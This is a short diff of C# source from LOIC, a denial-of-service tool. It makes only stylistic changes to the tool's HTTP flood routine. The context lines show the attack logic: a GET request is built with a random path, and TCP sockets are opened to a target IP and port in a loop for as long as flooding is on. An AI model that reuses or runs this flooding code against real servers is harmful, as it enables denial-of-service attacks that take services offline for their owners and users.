@@ -47,7 +47,7 @@ namespace LOIC
 			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
 			tTimepoll.Start();
 
-			var bw = new BackgroundWorker();
+			BackgroundWorker bw = new BackgroundWorker();
 			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
 			bw.RunWorkerAsync();
 		}
@@ -67,14 +67,14 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, ( random ? new Functions().RandomString() : null ), Environment.NewLine, Host));
-				var RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{3}Host: {2}{3}{3}{3}", Subsite, ( random ? new Functions().RandomString() : null ), Host, Environment.NewLine));
+				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
 					LastAction = Tick();
 					byte[] recvBuf = new byte[64];
-					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
 					
 					try { socket.Connect(RHost); }
